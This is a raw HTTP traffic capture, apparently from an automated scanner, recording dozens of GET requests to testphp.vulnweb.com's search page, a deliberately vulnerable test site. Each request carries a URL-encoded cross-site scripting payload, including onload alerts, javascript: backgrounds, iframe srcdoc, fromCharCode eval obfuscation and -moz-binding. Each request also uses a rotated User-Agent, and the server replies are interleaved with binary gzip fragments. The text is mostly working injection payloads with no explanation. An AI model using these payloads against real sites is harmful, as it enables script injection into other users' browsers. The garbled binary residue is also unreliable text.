+..W...
+
+GET /search.php?test=query%3CBODY%20BACKGROUND=%22javascript:alert('XSS')%22%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16D57
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+......
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:25 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+0.J...
+
+GET /search.php?test=query%3CBODY%20ONLOAD=alert('XSS')%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....0.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:25 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+...t..
+
+GET /search.php?test=query%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert('XSS')%22)%7D%3C/STYLE%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:26 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+C.|&..
+
+GET /search.php?test=query%3CBODY%20onload
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:27 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.Vb...
+
+GET /search.php?test=query%3CBODY%20BACKGROUND=%22javascript:alert('XSS')%22%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.1.749 Yowser/2.5 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+.....V
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:27 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+i..7..
+
+GET /search.php?test=query%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert('XSS')%22)%7D%3C/STYLE%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:28 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+7.....
+
+GET /search.php?test=query%3Cbody/onload=&lt;!--&gt;
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPad; CPU OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+.../7.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:28 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+,N]...
+
+GET /search.php?test=query%3Ciframe%20srcdoc='&lt;body%20onload=prompt&lpar;1&rpar;&gt;'%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....,N
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:29 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+Z~	...
+
+GET /search.php?test=query
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...+Z~
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:30 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..b...
+
+GET /search.php?test=query%3Cbody/onload=&lt;!--&gt;
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...:..
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:30 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+{hl...
+
+GET /search.php?test=query%3CBODY%20ONLOAD=alert(%EF%BF%BDXSS%EF%BF%BD)%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...X{h
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:31 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+h..=..
+
+GET /search.php?test=query%3CBODY%20ONLOAD=alert('hellox%20worldss')%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:32 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+v..,..
+
+GET /search.php?test=query%3Cbody%20onscroll=alert(XSS)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E...%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:32 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+......
+
+GET /search.php?test=query&lt;BODY%20BACKGROUND=%5C%22javascript
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+......
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:33 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+......
+
+GET /search.php?test=query&lt;BODY%20ONLOAD=alert('XSS')&gt;%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+......
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:33 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+R.K3..
+
+GET /search.php?test=query&lt;STYLE&gt;BODY%7B-moz-binding
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...CR.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:34 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..,I..
+
+GET /search.php?test=query&lt;STYLE%20type=%5C%22text/css%5C%22&gt;BODY%7Bbackground
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:35 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+M^....
+
+GET /search.php?test=query&lt;HTML&gt;&lt;BODY&gt;%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....M^
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:36 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+b.q ..
+
+GET /search.php?test=query&lt;/BODY&gt;&lt;/HTML&gt;%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:37 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+......
+
+GET /search.php?test=query&lt;BODY%20onload
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.1.749 Yowser/2.5 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...}..
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:37 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..=<..
+
+GET /search.php?test=query%3CBODY%20onload
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:38 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+$.....
+
+GET /search.php?test=query%3CBODY%20onload
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...G$.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:38 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.9.<..
+
+GET /search.php?test=query%3CBODY%20BACKGROUND=%22javascript:alert('XSS')%22%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:39 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..t...
+
+GET /search.php?test=query%3Cbody%20id=XSS%20onscroll=eval(String%5B'fromCharCode'%5D(97,108,101,114,116,40,39,120,115,115,39,41,32))%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+......
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:40 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+#.....
+
+GET /search.php?test=query%3Cbody%20background=javascript:'%22%3E%3Cscript%3Ealert(XSS)%3C/script%3E%3E%3C/body%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....#.
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:40 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+...H..
+
+GET /search.php?test=query%3Cform%20name=document%3E%3Cimage%20name=body%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:41 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..4...
+
+GET /search.php?test=query%3Cbody%20background=javascript:'%22%3E%3Cscript%3Ealert(navigator.userAgent)%3C/script%3E%3E%3C/body%3E%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+......
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:42 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+r..%..
+
+GET /search.php?test=query%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:42 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+.F.m..
+
+GET /search.php?test=query%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:43 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+y <:..
+
+GET /search.php?test=query%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:43 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+..Er..
+
+GET /search.php?test=query%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:44 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+2^!...
+
+GET /search.php?test=query%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+....2^
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:45 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
+Content-Encoding: gzip
+..H...
+
+GET /search.php?test=query%0
+
+HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+...9..
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.0
+Date: Sun, 29 Oct 2023 17:41:45
